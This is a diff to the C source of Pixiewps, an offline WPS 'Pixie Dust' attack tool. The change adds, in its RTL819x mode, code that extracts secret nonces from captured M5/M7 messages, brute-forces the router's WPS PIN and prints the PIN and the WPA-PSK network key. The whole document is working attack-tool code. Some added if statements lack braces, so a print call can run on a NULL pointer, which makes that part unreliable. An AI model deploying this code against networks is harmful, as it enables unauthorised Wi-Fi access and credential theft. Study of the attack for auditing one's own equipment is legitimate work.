@@ -477,6 +477,8 @@ usage_err:
 		wps->wrapkey = malloc(WPS_KEYWRAPKEY_LEN); if (!wps->wrapkey) goto memory_err;
 		wps->emsk    = malloc(WPS_EMSK_LEN);       if (!wps->emsk)    goto memory_err;
 
+		gettimeofday(&t_start, 0);
+
 		/* DHKey = SHA-256(g^(AB) mod p) = SHA-256(PKe^A mod p) = SHA-256(PKr^B mod p) */
 		crypto_mod_exp(wps->pkr, WPS_PKEY_LEN, wps->e_key, WPS_PKEY_LEN, dh_group5_prime, WPS_PKEY_LEN, buffer, &pkey_len);
 		sha256(buffer, WPS_PKEY_LEN, wps->dhkey);
@@ -515,11 +517,41 @@ usage_err:
 			}
 		}
 
+		uint_fast8_t pfound = PIN_ERROR;
+		char pin[WPS_PIN_LEN + 1];
+		vtag_t *vtag;
+		if (decrypted5 && decrypted7 && wps->e_hash1 && wps->e_hash2) {
+			wps->e_s1 = malloc(WPS_SECRET_NONCE_LEN); if (!wps->e_s1) goto memory_err;
+			wps->e_s2 = malloc(WPS_SECRET_NONCE_LEN); if (!wps->e_s2) goto memory_err;
+			wps->psk1 = malloc(WPS_HASH_LEN);         if (!wps->psk1) goto memory_err;
+			wps->psk2 = malloc(WPS_HASH_LEN);         if (!wps->psk2) goto memory_err;
+			if ((vtag = find_vtag(decrypted5, wps->m5_encr_len - 16, WPS_TAG_E_SNONCE_1, WPS_NONCE_LEN))) {
+				memcpy(wps->e_s1, vtag->data, WPS_NONCE_LEN);
+			}
+			else {
+				printf("\n Pixiewps %s\n", SHORT_VERSION);
+				printf("\n [x] Unexpected error (--m5-enc)!\n\n");
+				return UNS_ERROR;
+			}
+			if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_E_SNONCE_2, WPS_NONCE_LEN))) {
+				memcpy(wps->e_s2, vtag->data, WPS_NONCE_LEN);
+			}
+			else {
+				printf("\n Pixiewps %s\n", SHORT_VERSION);
+				printf("\n [x] Unexpected error (--m7-enc)!\n\n");
+				return UNS_ERROR;
+			}
+
+			pfound = crack(wps, pin);
+		}
+
+		gettimeofday(&t_end, 0);
+		unsigned long ms_elapsed = get_elapsed_ms(&t_start, &t_end);
+
 		printf("\n Pixiewps %s\n", SHORT_VERSION);
 		if (wps->verbosity > 1) {
 			printf("\n [?] Mode:     %d (%s)", RTL819x, p_mode_name[RTL819x]);
 		}
-		vtag_t *vtag;
 		if (wps->verbosity > 2) {
 			printf("\n [*] DHKey:    "); byte_array_print(wps->dhkey, WPS_HASH_LEN);
 			printf("\n [*] KDK:      "); byte_array_print(wps->kdk, WPS_HASH_LEN);
@@ -530,12 +562,18 @@ usage_err:
 				memcpy(buffer, vtag->data, WPS_TAG_KEYWRAP_AUTH_LEN);
 				printf("\n [*] KWA:      "); byte_array_print(buffer, WPS_TAG_KEYWRAP_AUTH_LEN);
 			}
+			if (pfound == PIN_FOUND) {
+				printf("\n [*] PSK1:     "); byte_array_print(wps->psk1, WPS_PSK_LEN);
+				printf("\n [*] PSK2:     "); byte_array_print(wps->psk2, WPS_PSK_LEN);
+			}
 		}
-		if ((vtag = find_vtag(decrypted5, wps->m5_encr_len - 16, WPS_TAG_E_SNONCE_1, WPS_NONCE_LEN))) {
-			printf("\n [*] ES1:      "); byte_array_print(vtag->data, WPS_NONCE_LEN);
-		}
-		if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_E_SNONCE_2, WPS_NONCE_LEN))) {
-			printf("\n [*] ES2:      "); byte_array_print(vtag->data, WPS_NONCE_LEN);
+		if (wps->verbosity > 1) {
+			if (decrypted5) {
+				if ((vtag = find_vtag(decrypted5, wps->m5_encr_len - 16, WPS_TAG_E_SNONCE_1, WPS_NONCE_LEN)))
+					printf("\n [*] ES1:      "); byte_array_print(vtag->data, WPS_NONCE_LEN);
+			}
+			if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_E_SNONCE_2, WPS_NONCE_LEN)))
+				printf("\n [*] ES2:      "); byte_array_print(vtag->data, WPS_NONCE_LEN);
 		}
 		if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_SSID, 0))) {
 			int tag_size = be16_to_h(vtag->len);
@@ -543,17 +581,34 @@ usage_err:
 			buffer[tag_size] = '\0';
 			printf("\n [*] SSID:     %s", buffer);
 		}
+		if (pfound == PIN_FOUND) {
+			if (pin[0] == '\0')
+				printf("\n [+] WPS pin:  <empty>");
+			else
+				printf("\n [+] WPS pin:  %s", pin);
+		}
 		if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_NET_KEY, 0))) {
 			int tag_size = be16_to_h(vtag->len);
 			memcpy(buffer, vtag->data, tag_size);
 			buffer[tag_size] = '\0';
-			printf("\n [+] WPA-PSK:  %s\n\n", buffer);
+			printf("\n [+] WPA-PSK:  %s", buffer);
 		} else {
-			printf("\n [-] PSK not found!\n\n");
+			printf("\n [-] WPA-PSK not found!");
 		}
 
-		if (decrypted5)
+		printf("\n\n [*] Time taken: %lu s %lu ms\n\n", ms_elapsed / 1000, ms_elapsed % 1000);
+
+		if (decrypted5) {
 			free(decrypted5);
+			if (wps->e_hash1 && wps->e_hash2) {
+				free(wps->e_hash1);
+				free(wps->e_hash2);
+				free(wps->e_s1);
+				free(wps->e_s2);
+				free(wps->psk1);
+				free(wps->psk2);
+			}
+		}
 
 		free(decrypted7);
 		free(buffer);
